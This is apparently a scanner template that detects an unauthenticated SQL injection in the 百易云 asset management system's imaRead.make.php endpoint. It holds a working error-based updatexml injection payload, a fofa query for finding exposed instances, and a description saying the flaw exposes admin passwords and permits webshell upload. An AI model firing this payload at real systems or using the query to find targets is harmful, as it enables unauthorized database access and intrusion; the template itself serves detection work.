# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: |
      feeItem[]=1+AND+updatexml(1,concat(0x7e,{{md5(12345678)}}),1)
    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - 'XPATH syntax error:'
          - 25d55ad283aa400af464c76d713c07a
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/adminx/imaRead.make.php?act=remake'
id: baiyiyun-imaread-make-sqli
info:
  author: avic123
  description: |
    百易云资产管理运营系统 imaRead.make.php 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    fofa: body="media/css/uniform.default.css" && body="资管云" || body="不要着急，点此" || title="资管云"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 百易云资管系统-imaRead.make.php-SQL注入漏洞
  severity: high
  tags: baiyiyun,sqli,argus-import
